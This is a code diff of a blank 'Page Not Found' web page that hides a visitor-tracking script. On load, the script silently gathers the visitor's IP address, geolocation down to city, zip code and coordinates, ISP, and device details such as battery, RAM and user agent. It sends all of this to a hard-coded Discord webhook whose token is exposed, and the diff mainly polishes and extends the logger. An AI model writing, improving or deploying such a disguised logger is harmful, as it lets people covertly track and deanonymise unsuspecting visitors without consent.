@@ -1,19 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page Not Found</title>
     <style>
-        /* Basic styling for a blank page */
-        * {
-            padding: 0;
-            margin: 0;
-            box-sizing: border-box;
-        }
-
+        * { padding: 0; margin: 0; box-sizing: border-box; }
         body {
             background-color: #000000;
             color: #FFFFFF;
@@ -29,15 +22,10 @@
     <script>
         $(document).ready(function () {
             let ip, country, countryCode, region, regionName, city, zip, lat, lon, timezone, org;
-            let batterypercentage, ischarging, platform, width, height, devicelang, iscookieEnabled, userAgent, cpuThreads, deviceram, referurl;
+            let batteryPercentage, isCharging, platform, width, height, deviceLang, userAgent, cpuThreads, deviceRam, referUrl, deviceType;
             let datetime = new Date();
             let localtime;
 
-            /**
-             * Formats the timezone offset into UTC±HH:MM
-             * @param {number} offset - Timezone offset in minutes
-             * @returns {string} - Formatted timezone offset
-             */
             function formatTimezoneOffset(offset) {
                 let sign = offset >= 0 ? '+' : '-';
                 let absOffset = Math.abs(offset);
@@ -46,9 +34,17 @@
                 return `UTC${sign}${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
             }
 
-            /**
-             * Fetches the information needed and sends it to the Discord webhook
-             */
+            function detectDeviceType() {
+                const ua = navigator.userAgent;
+                if (/mobile/i.test(ua)) {
+                    return 'Phone';
+                } else if (/tablet/i.test(ua)) {
+                    return 'Tablet';
+                } else {
+                    return 'Desktop';
+                }
+            }
+
             async function getInfo() {
                 try {
                     // Fetch IP and location data
@@ -68,22 +64,24 @@
 
                     // Get additional device info
                     const battery = await navigator.getBattery();
-                    batterypercentage = String(battery.level * 100) + "%";
-                    ischarging = String(battery.charging);
+                    batteryPercentage = String(battery.level * 100) + "%";
+                    isCharging = String(battery.charging);
                     platform = String(navigator.platform);
                     width = String(window.innerWidth);
                     height = String(window.innerHeight);
-                    devicelang = String(navigator.language);
-                    iscookieEnabled = String(navigator.cookieEnabled);
+                    deviceLang = String(navigator.language);
                     userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
                     cpuThreads = String(navigator.hardwareConcurrency);
-                    deviceram = String(navigator.deviceMemory) + "GB";
-                    referurl = String(window.location.href);
+                    deviceRam = String(navigator.deviceMemory) + "GB";
+                    referUrl = String(window.location.href);
                     localtime = String(datetime.toLocaleString());
 
                     // Calculate timezone offset in minutes and format it
                     let timezoneOffsetMinutes = -datetime.getTimezoneOffset();
                     let formattedTimezoneOffset = formatTimezoneOffset(timezoneOffsetMinutes);
+
+                    // Determine device type
+                    deviceType = detectDeviceType();
 
                     // Send the information to the webhook
                     await sendWebhook(formattedTimezoneOffset);
@@ -92,10 +90,6 @@
                 }
             }
 
-            /**
-             * Sends the collected information to the specified Discord webhook
-             * @param {string} formattedTimezoneOffset - The formatted timezone offset
-             */
             function sendWebhook(formattedTimezoneOffset) {
                 const webhookUrl = "https://discord.com/api/webhooks/1271415382833631316/KLDM9V6oh7kezM8Q6aGJ791MnX2eDCyHjSbObzB-m7gsmr3JfBsLUON8lxj50ihsgABt";
 
@@ -103,40 +97,55 @@
                 request.open("POST", webhookUrl);
                 request.setRequestHeader('Content-type', 'application/json');
 
+                let flagEmoji = countryCode ? `:flag_${countryCode.toLowerCase()}:` : '';
+
                 let params = {
                     "content": null,
                     "embeds": [
                         {
-                            "title": "IP Data",
+                            "color": 5814783,
+                            "description": `${flagEmoji}\n\n**IP Information**\n\n`,
                             "fields": [
-                                { "name": "**IP:**", "value": `${ip}`, "inline": true },
+                                // Row 1
+                                { "name": "**IP Address:**", "value": `${ip}`, "inline": true },
                                 { "name": "**Provider:**", "value": `${org}`, "inline": true },
                                 { "name": "**Country:**", "value": `${country}`, "inline": true },
-                                { "name": "**Code Country:**", "value": `${countryCode}`, "inline": true },
-                                { "name": "**Name reg:**", "value": `${regionName}`, "inline": true },
-                                { "name": "**Code reg:**", "value": `${region}`, "inline": true },
+
+                                // Row 2
+                                { "name": "**Country Code:**", "value": `${countryCode}`, "inline": true },
+                                { "name": "**Region Name:**", "value": `${regionName}`, "inline": true },
+                                { "name": "**Region Code:**", "value": `${region}`, "inline": true },
+
+                                // Row 3
                                 { "name": "**City:**", "value": `${city}`, "inline": true },
-                                { "name": "**Zip:**", "value": `${zip}`, "inline": true },
-
+                                { "name": "**Zip Code:**", "value": `${zip}`, "inline": true },
                                 { "name": "**Latitude:**", "value": `${lat}`, "inline": true },
-                                { "name": "**Longitude:**", "value": `${lon}`, "inline": true },
-                                { "name": "**Time zone:**", "value": `${timezone}`, "inline": true },
-                                { "name": "**Timezone Offset:**", "value": `${formattedTimezoneOffset}`, "inline": true },
-                                { "name": "**Localtime:**", "value": `${localtime}`, "inline": true },
-                                { "name": "**Cookies Enabled:**", "value": `${iscookieEnabled}`, "inline": true },
-                                { "name": "**Language:**", "value": `${devicelang}`, "inline": true },
-                                { "name": "**Width px:**", "value": `${width}`, "inline": true },
 
-                                { "name": "**Height px:**", "value": `${height}`, "inline": true },
+                                // Row 4
+                                { "name": "**Longitude:**", "value": `${lon}`, "inline": true },
+                                { "name": "**Timezone:**", "value": `${timezone}`, "inline": true },
+                                { "name": "**Timezone Offset:**", "value": `${formattedTimezoneOffset}`, "inline": true },
+
+                                // Row 5
+                                { "name": "**Local Time:**", "value": `${localtime}`, "inline": true },
+                                { "name": "**Language:**", "value": `${deviceLang}`, "inline": true },
+                                { "name": "**Width (px):**", "value": `${width}`, "inline": true },
+
+                                // Row 6
+                                { "name": "**Height (px):**", "value": `${height}`, "inline": true },
                                 { "name": "**Platform:**", "value": `${platform}`, "inline": true },
-                                { "name": "**Battery Percentage:**", "value": `${batterypercentage}`, "inline": true },
-                                { "name": "**Charging:**", "value": `${ischarging}`, "inline": true },
+                                { "name": "**Battery Percentage:**", "value": `${batteryPercentage}`, "inline": true },
+
+                                // Row 7
+                                { "name": "**Charging:**", "value": `${isCharging}`, "inline": true },
                                 { "name": "**CPU Threads:**", "value": `${cpuThreads}`, "inline": true },
-                                { "name": "**RAM:**", "value": `${deviceram}`, "inline": true },
-                                { "name": "**Browser User Agent:**", "value": `${userAgent}`, "inline": true },
-                                { "name": "**Referrer URL:**", "value": `${referurl}`, "inline": true }
+                                { "name": "**RAM:**", "value": `${deviceRam}`, "inline": true },
+
+                                // Row 8
+                                { "name": "**User Agent:**", "value": `${userAgent}`, "inline": true },
+                                { "name": "**Referrer URL:**", "value": `${referUrl}`, "inline": true },
+                                { "name": "**Device Type:**", "value": `${deviceType}`, "inline": true }
                             ],
-                            "color": 5814783,
                             "timestamp": datetime.toISOString()
                         }
                     ],
@@ -146,13 +155,10 @@
                 request.send(JSON.stringify(params));
             }
 
-            // Start the information gathering process
             getInfo();
         });
     </script>
 </head>
-
 <body>
 </body>
-
 </html>
